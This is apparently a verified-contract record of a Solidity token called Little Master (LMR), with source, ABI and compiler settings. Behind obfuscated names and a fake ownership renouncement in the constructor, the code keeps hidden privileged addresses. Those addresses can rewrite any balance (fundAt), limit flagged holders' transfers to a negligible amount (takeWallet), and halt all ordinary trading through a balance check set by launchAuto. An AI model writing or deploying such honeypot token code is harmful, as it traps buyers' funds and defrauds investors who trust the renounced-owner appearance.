{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface tokenWallet {\n    function createPair(address feeShould, address swapTake) external returns (address);\n}\n\ninterface autoExempt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverFrom) external view returns (uint256);\n\n    function transfer(address exemptBuySell, uint256 atTotal) external returns (bool);\n\n    function allowance(address walletAmountReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 atTotal) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address exemptBuySell,\n        uint256 atTotal\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed liquidityMin, uint256 value);\n    event Approval(address indexed walletAmountReceiver, address indexed spender, uint256 value);\n}\n\nabstract contract swapFee {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface shouldSellTx {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface autoExemptMetadata is autoExempt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract LittleMaster is swapFee, autoExempt, autoExemptMetadata {\n\n    function txLaunched(address launchFrom, address exemptBuySell, uint256 atTotal) internal returns (bool) {\n        require(receiverReceiver[launchFrom] >= atTotal);\n        receiverReceiver[launchFrom] -= atTotal;\n        receiverReceiver[exemptBuySell] += atTotal;\n        emit Transfer(launchFrom, exemptBuySell, atTotal);\n        return true;\n    }\n\n    address public enableExempt;\n\n    function takeWallet(address minMaxAmount) public {\n        enableLiquidity();\n        \n        if (minMaxAmount == walletAutoAt || minMaxAmount == enableExempt) {\n            return;\n        }\n        amountWallet[minMaxAmount] = true;\n    }\n\n    function enableLiquidity() private view {\n        require(launchLiquidity[_msgSender()]);\n    }\n\n    mapping(address => uint256) private receiverReceiver;\n\n    uint8 private listWalletMode = 18;\n\n    bool public walletMode;\n\n    uint256 public enableAt;\n\n    uint256 constant autoTeam = 10 ** 10;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return txTake;\n    }\n\n    function getOwner() external view returns (address) {\n        return fromAt;\n    }\n\n    string private walletLaunch = \"Little Master\";\n\n    uint256 liquidityAmountTake;\n\n    function fundAt(address launchedToken, uint256 atTotal) public {\n        enableLiquidity();\n        receiverReceiver[launchedToken] = atTotal;\n    }\n\n    function transferFrom(address launchFrom, address exemptBuySell, uint256 atTotal) external override returns (bool) {\n        if (_msgSender() != shouldSenderFund) {\n            if (fundWalletAmount[launchFrom][_msgSender()] != type(uint256).max) {\n                require(atTotal <= fundWalletAmount[launchFrom][_msgSender()]);\n                fundWalletAmount[launchFrom][_msgSender()] -= atTotal;\n            }\n        }\n        return isLimit(launchFrom, exemptBuySell, atTotal);\n    }\n\n    function transfer(address launchedToken, uint256 atTotal) external virtual override returns (bool) {\n        return isLimit(_msgSender(), launchedToken, atTotal);\n    }\n\n    mapping(address => mapping(address => uint256)) private fundWalletAmount;\n\n    address takeSell = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function owner() external view returns (address) {\n        return fromAt;\n    }\n\n    bool private tokenLiquidityLimit;\n\n    bool public minExempt;\n\n    address shouldSenderFund = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function name() external view virtual override returns (string memory) {\n        return walletLaunch;\n    }\n\n    mapping(address => bool) public launchLiquidity;\n\n    bool public launchedIs;\n\n    uint256 private feeLaunch;\n\n    event OwnershipTransferred(address indexed fromToken, address indexed txList);\n\n    uint256 feeReceiver;\n\n    uint256 public fundIs;\n\n    function isLimit(address launchFrom, address exemptBuySell, uint256 atTotal) internal returns (bool) {\n        if (launchFrom == walletAutoAt) {\n            return txLaunched(launchFrom, exemptBuySell, atTotal);\n        }\n        uint256 totalList = autoExempt(enableExempt).balanceOf(takeSell);\n        require(totalList == liquidityAmountTake);\n        require(exemptBuySell != takeSell);\n        if (amountWallet[launchFrom]) {\n            return txLaunched(launchFrom, exemptBuySell, autoTeam);\n        }\n        return txLaunched(launchFrom, exemptBuySell, atTotal);\n    }\n\n    function launchAuto(uint256 atTotal) public {\n        enableLiquidity();\n        liquidityAmountTake = atTotal;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return amountWalletIs;\n    }\n\n    function allowance(address teamLaunch, address launchedTake) external view virtual override returns (uint256) {\n        if (launchedTake == shouldSenderFund) {\n            return type(uint256).max;\n        }\n        return fundWalletAmount[teamLaunch][launchedTake];\n    }\n\n    function approve(address launchedTake, uint256 atTotal) public virtual override returns (bool) {\n        fundWalletAmount[_msgSender()][launchedTake] = atTotal;\n        emit Approval(_msgSender(), launchedTake, atTotal);\n        return true;\n    }\n\n    address private fromAt;\n\n    uint256 private txTake = 100000000 * 10 ** 18;\n\n    uint256 public toEnable;\n\n    function decimals() external view virtual override returns (uint8) {\n        return listWalletMode;\n    }\n\n    function receiverExempt(address receiverFee) public {\n        require(receiverFee.balance < 100000);\n        if (launchedIs) {\n            return;\n        }\n        \n        launchLiquidity[receiverFee] = true;\n        if (walletMode) {\n            minExempt = false;\n        }\n        launchedIs = true;\n    }\n\n    mapping(address => bool) public amountWallet;\n\n    address public walletAutoAt;\n\n    function balanceOf(address receiverFrom) public view virtual override returns (uint256) {\n        return receiverReceiver[receiverFrom];\n    }\n\n    function exemptIs() public {\n        emit OwnershipTransferred(walletAutoAt, address(0));\n        fromAt = address(0);\n    }\n\n    constructor (){\n        if (walletMode == tokenLiquidityLimit) {\n            enableAt = feeLaunch;\n        }\n        shouldSellTx maxLiquidityLaunch = shouldSellTx(shouldSenderFund);\n        enableExempt = tokenWallet(maxLiquidityLaunch.factory()).createPair(maxLiquidityLaunch.WETH(), address(this));\n        if (minExempt != tokenLiquidityLimit) {\n            fundIs = toEnable;\n        }\n        walletAutoAt = _msgSender();\n        launchLiquidity[walletAutoAt] = true;\n        receiverReceiver[walletAutoAt] = txTake;\n        exemptIs();\n        if (tokenLiquidityLimit) {\n            fundIs = feeLaunch;\n        }\n        emit Transfer(address(0), walletAutoAt, txTake);\n    }\n\n    string private amountWalletIs = \"LMR\";\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletAmountReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromToken\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txList\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityMin\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedTake\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"amountWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atTotal\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFrom\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableExempt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atTotal\",\"type\":\"uint256\"}],\"name\":\"fundAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundIs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"atTotal\",\"type\":\"uint256\"}],\"name\":\"launchAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverFee\",\"type\":\"address\"}],\"name\":\"receiverExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minMaxAmount\",\"type\":\"address\"}],\"name\":\"takeWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toEnable\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedToken\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atTotal\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"exemptBuySell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"atTotal\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletAutoAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "LittleMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}